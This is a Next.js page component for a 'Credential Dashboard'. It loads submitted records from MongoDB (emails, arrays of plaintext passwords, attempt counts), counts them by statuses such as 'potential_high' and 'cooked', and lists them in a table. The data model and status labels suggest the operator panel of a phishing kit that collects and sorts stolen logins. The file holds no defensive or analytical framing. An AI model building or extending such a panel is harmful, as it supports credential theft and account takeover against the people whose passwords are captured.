import { Metadata } from "next";
import { UserNav } from "@/components/user-nav";
import { z } from "zod";
import { DataTable } from "@/components/DataTable";
import { connectToDatabase } from "@/lib/mongodb";
import { CredentialModel, ICredential } from "@/models/Credential";
import { User, Clock, AlertTriangle, CheckCircle } from 'lucide-react';

export const metadata: Metadata = {
  title: "Credential Dashboard",
  description: "Credential submission statistics and monitoring dashboard",
};

// Define the credential schema
const credentialSchema = z.object({
  id: z.string(),
  email: z.string().email(),
  passwords: z.array(z.string()),
  attempts: z.number(),
  createdAt: z.date(),
  status: z.enum(["new", "pending", "potential_low", "potential_high", "cooked"]),
});

async function getCredentialStats(): Promise<{
  total: number;
  byStatus: Record<string, number>;
  allSubmissions: ICredential[];
  averageAttempts: number;
}> {
  await connectToDatabase();

  const data: ICredential[] = await CredentialModel.find();

  const validatedData = data.map((data) => {
    try {
      return credentialSchema.parse({
        id: (data._id as string).toString(),
        email: data.email,
        passwords: data.passwords,
        attempts: data.attempts,
        status: data.status,
        createdAt: data.createdAt,
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        console.error("Validation Errors for data:", data, error.errors);
        return null;
      }
      throw error;
    }
  }).filter(Boolean) as ICredential[];

  const byStatusCounts: Record<string, number> = {
    new: 0,
    pending: 0,
    potential_low: 0,
    potential_high: 0,
    cooked: 0,
  };

  validatedData.forEach((d) => {
    if (d && d.status in byStatusCounts) {
      byStatusCounts[d.status]++;
    }
  });

  return {
    total: validatedData.length,
    byStatus: byStatusCounts,
    allSubmissions: validatedData,
    averageAttempts: validatedData.length
      ? validatedData.reduce((acc, curr) => acc + curr.attempts, 0) / validatedData.length
      : 0,
  };
}

export default async function DashboardPage() {
  const stats = await getCredentialStats();

  return (
    <>
      <div className="flex flex-col space-y-8 p-4 md:p-8">
        <div className="flex items-center justify-between space-y-2">
          <div>
            <h2 className="text-xl md:text-2xl font-bold tracking-tight">Welcome back!</h2>
            <p className="text-muted-foreground">
              Here&apos;s a list of your tasks for this month!
            </p>
          </div>
          <div className="flex items-center space-x-2">
            <UserNav />
          </div>
        </div>
        <h1 className="text-xl md:text-2xl font-bold">Credential Dashboard</h1>
        <div className="mt-4 grid grid-cols-1 gap-4 md:grid-cols-2 lg:grid-cols-4">
          <div className="p-4 border rounded-lg shadow-md flex items-center">
            <User className="text-2xl mr-2" />
            <div>
              <h3 className="text-lg font-bold">Total Credentials</h3>
              <p>{stats.total}</p>
            </div>
          </div>
          <div className="p-4 border rounded-lg shadow-md flex items-center">
            <Clock className="text-2xl mr-2" />
            <div>
              <h3 className="text-lg font-bold">Average Attempts</h3>
              <p>{stats.averageAttempts.toFixed(2)}</p>
            </div>
          </div>
          <div className="p-4 border rounded-lg shadow-md flex items-center">
            <AlertTriangle className="text-2xl mr-2" />
            <div>
              <h3 className="text-lg font-bold">Potential Low</h3>
              <p>{stats.byStatus.potential_low}</p>
            </div>
          </div>
          <div className="p-4 border rounded-lg shadow-md flex items-center">
            <CheckCircle className="text-2xl mr-2" />
            <div>
              <h3 className="text-lg font-bold">Potential High</h3>
              <p>{stats.byStatus.potential_high}</p>
            </div>
          </div>
        </div>
        <div className="mt-4">
          <h2 className="text-xl">All Submissions</h2>
          <DataTable data={stats.allSubmissions.map(submission => ({
            ...submission,
            _id: submission.id,
            createdAt: submission.createdAt.toString()
          }))} />
        </div>
      </div>
    </>
  );
}
